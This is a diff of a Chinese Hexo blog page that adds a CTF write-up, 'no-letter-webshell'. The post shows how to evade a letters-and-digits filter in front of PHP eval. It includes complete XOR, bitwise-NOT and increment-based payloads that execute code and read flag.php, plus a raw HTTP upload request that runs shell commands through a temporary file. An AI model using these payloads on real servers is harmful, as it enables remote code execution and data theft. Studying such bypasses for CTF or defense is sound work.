@@ -6,7 +6,7 @@
     <meta name="referrer" content="origin">
     <meta http-equiv="Cache-Control" content="no-transform">
     <meta http-equiv="Cache-Control" content="no-siteapp">
-    <title>归档</title>
+    <title>no-letter-webshell</title>
     <link rel="shortcut icon" href="#"/>
 
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/LongCang.css">
@@ -18,55 +18,107 @@
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Rosario.css">
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/UbuntuMono.css">
 
-    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/archive.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/post.css">
+    
+        <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/normal.css">
+    
 
     <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/jquery-3.4.1.min.js"></script>
+
 <meta name="generator" content="Hexo 5.4.0"></head>
 <body>
     <a id="cover"></a>
     <div id="header">
-    <div class="header" >
+    <div class="header">
         <div class="vertical">
             <div class="inner">
-                <h1 class="header-title"></h1>
-                <h2 class="header-description" id="hitokoto"></h2>
-                <h3 class="header-info" id="hitokotoAuthor"></h3>
-                <!--
-                <h1 class="header-subtitle"></h1>
-                <p class="header-subinfo"></p>
-                -->
+                <h1 class="header-subtitle">no-letter-webshell</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2021-11-02
+                        </span>
+                        
+                            <span id="/2021/11/02/no-letter-webshell/" class="leancloud_visitors" data-flag-title="no-letter-webshell">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/11/02/no-letter-webshell/"></span>
+                        </span>  
+                    </p>                 
+                </div>
             </div>
         </div>
-        <a class="scroll-down" href="javascript:;" target="_self" data-offset="-45">
-            <span class="hidden">Scroll Down</span>
-            <i class="scroll-down-icon iconfont icon-return"></i>
-        </a>
+        <canvas id="articleHeaderCanvas"></canvas>
     </div>
 </div>
     <div id="container">
     <div id="content">
-          
-    <div class="articles-year">
-        <h2>2020</h2>
-        <ul class="list">
+        <div id="article">
+    <div class="toc"></div>
+    <div class="article-body">
+        <h2 id="前言：本文针对这道题目举例"><a href="#前言：本文针对这道题目举例" class="headerlink" title="前言：本文针对这道题目举例"></a>前言：本文针对这道题目举例</h2><?php
+if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
+  eval($_GET['shell']);
+}
+其实就是对匹配字母和数字的正则进行绕过
+
+<span id="more"></span>
+
+## 基础概念
+<? ?><p> 相当于对 <?php ?> 的替换。而 <?= ?> 则是相当于 <?php echo ... ?><br><?='Hello World'?>    // 输出 “Hello World”<br>PHP中，反引号可以直接命令执行系统命令，但是如果想要输出执行结果还需要使用 echo 等函数：<br><?php echo `ls /`;?> // Linux<br><?php echo `dir`;?> // Windows<br>等同于<br><?= `ls /`?> // Linux<br><?= `dir`?> // Windows</p>
+<h2 id="PHP-5-和-PHP-7-的区别"><a href="#PHP-5-和-PHP-7-的区别" class="headerlink" title="PHP 5 和 PHP 7 的区别"></a>PHP 5 和 PHP 7 的区别</h2><p>在 PHP 5 中，assert() 是一个函数，我们可以用 $<em>=assert;$</em>() 这样的形式来实现代码的动态执行。但是在 PHP 7 中，assert() 变成了一个和 eval() 一样的语言结构，不再支持上面那种调用方法。（但是好像在 PHP 7.0.12 下还能这样调用）<br>PHP5中，是不支持 ($a)() 这种调用方法的，但在 PHP 7 中支持这种调用方法，因此支持这么写 (‘phpinfo’)();</p>
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。<br>PHP5payload:?shell=$<em>=(‘%01’^’<code>&#39;).(&#39;%13&#39;^&#39;</code>‘).(‘%13’^’<code>&#39;).(&#39;%05&#39;^&#39;</code>‘).(‘%12’^’<code>&#39;).(&#39;%14&#39;^&#39;</code>‘);$__=’</em>‘.(‘%0D’^’]’).(‘%2F’^’`’).(‘%0E’^’]’).(‘%09’^’]’);$<em><strong>=$$</strong>;$</em>($__<em>[</em>]);<br>POST:  _=phpinfo();<br>_=show_source(“flag.php”);<br>_=var_dump(file(‘flag.php’));<br>_=readfile(‘flag.php’);<br>_=print_r(file(‘flag.php’)); </p>
+<p>取反运算payload：%24__%3D(‘%3E’%3E’%3C’)%2B(‘%3E’%3E’%3C’)%3B%24_%3D%24__%2F%24__%3B%24____%3D’’%3B%24___%3D%22%E7%9E%B0%22%3B%24____.%3D<del>(%24___%7B%24_%7D)%3B%24___%3D%22%E5%92%8C%22%3B%24____.%3D</del>(%24___%7B%24__%7D)%3B%24___%3D%22%E5%92%8C%22%3B%24____.%3D<del>(%24___%7B%24__%7D)%3B%24___%3D%22%E7%9A%84%22%3B%24____.%3D</del>(%24___%7B%24_%7D)%3B%24___%3D%22%E5%8D%8A%22%3B%24____.%3D<del>(%24___%7B%24_%7D)%3B%24___%3D%22%E5%A7%8B%22%3B%24____.%3D</del>(%24___%7B%24__%7D)%3B%24_____%3D_%3B%24___%3D%22%E4%BF%AF%22%3B%24_____.%3D<del>(%24___%7B%24__%7D)%3B%24___%3D%22%E7%9E%B0%22%3B%24_____.%3D</del>(%24___%7B%24__%7D)%3B%24___%3D%22%E6%AC%A1%22%3B%24_____.%3D<del>(%24___%7B%24_%7D)%3B%24___%3D%22%E7%AB%99%22%3B%24_____.%3D</del>(%24___%7B%24_%7D)%3B%24_%3D%24%24_____%3B%24____(%24_%5B%24__%5D)%3B<br>POST：2=phpinfo();<br>自增(php&lt;=7.0.12)payload：<br>?shell=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B’!’%3D%3D’%40’%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D’_’%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B<br>POST：_=phpinfo();<br>PHP&gt;7.0.12payload：使用异或/或/取反构造脚本即可。<br>比如// (‘phpinfo’)();<br>(“%0b%13%0b%12%12%18%13”^”%7b%7b%7b%7b%7c%7e%7c”)();</p>
+<p>绕过;<br>PHP 短标签中的代码不需要写分号，所以我们直接把所有的 PHP 语句改成短标签形式就行了。</p>
+<p>过滤$绕过：<br>PHP7<br>就用异或/或/取反/自增脚本即可。<br>PHP5<br>利用临时文件包含：<br>payload：<br>POST /?shell=?&gt;<?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?> HTTP/1.1<br>Host: xxx.xxx.xxx.xxx<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Content-Type:multipart/form-data;boundary=——–123<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Length: 109<br>———-123<br>Content-Disposition:form-data;name=”file”;filename=”1.txt”<br>!/bin/sh<br>ls /<br>———-123–</p>
+
+        <p class="suffix-end">__END__</p>
+        <div class="suffix-box">
+            <div class="suffix-box-left">
+                <img src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/image/sidebar/avatar.jpg" alt="xinZa1">
+            </div>
+            <div class="suffix-box-right">
+                <span class="suffix-box-title">文章作者</span>：xinZa1
+                <br>
+                <span class="suffix-box-title">文章出处</span>：<a href="/2021/11/02/no-letter-webshell/" target="_blank">no-letter-webshell</a>
+                <br>
+                <span class="suffix-box-title">作者签名</span>：看透生活的本质，然后继续热爱它.
+                <br>
+                <span class="suffix-box-title">关于主题</span>：<a href="https://github.com/xinZa1/xinZa1.github.io" target="_blank">xinZa1</a>
+                <br>
+                <span class="suffix-box-title">版权声明</span>：文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+                <br>
+            </div>
+            <div style="clear: both;"></div>
+        </div>
+    </div>
+    <div class="article-footer">
+        
+        
+            <div class="tag">
+                标签：
+                
+                    <a href="/tag/web/">web</a>
+                
+            </div>
+        
+        <div class="article-prev-next">
             
-                <li>
-                    <span class="date">2020/08/01</span>
-                    <a href="/2020/08/01/Hexo%E4%B8%BB%E9%A2%98LiveForCode%E4%BB%8B%E7%BB%8D/" title="Hexo主题LiveForCode介绍">    
-                        <span>Hexo主题LiveForCode介绍</span>
-                    </a>
-                </li>
             
-                <li>
-                    <span class="date">2020/01/01</span>
-                    <a href="/2020/01/01/HelloWorld/" title="Hello World">    
-                        <span>Hello World</span>
-                    </a>
-                </li>
-            
-        </ul>
+        </div>
+    </div>
+    
+    <div class="article-comments">
+        <div class="comments-title">
+            评论列表
+        </div>
+        <div class="comments-content">
+        </div>
     </div>
 
+</div>
 
     </div>
 </div>
@@ -140,7 +192,7 @@
         BlogAvatar    : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/image/sidebar/avatar.jpg',
         BlogStartDate : '2021-11-02',
 
-        WebsiteTitleBlur         : '(◍´꒳`◍) where?',
+        WebsiteTitleBlur         : '(◍´꒳`◍) where where',
         WebsiteTitleBlurTimeOut  : 500,
         WebsiteTitleFocus        : '(*´∇｀*) Welcome back!',
         WebsiteTitleFocusTimeOut : 1000,
@@ -348,7 +400,7 @@
                 
                     {
                         icon : 'icon-github', 
-                        url  : 'https://github.com/first19326'
+                        url  : 'https://github.com/xinZa1'
                     },
                 
             
@@ -403,8 +455,8 @@
         Donate : {
             paypal  : '',
             bitcoin : '',
-            alipay  : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/image/donate/alipay.png',
-            wechat  : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/image/donate/wechat.png'
+            alipay  : '',
+            wechat  : ''
         },
 
         Code : {
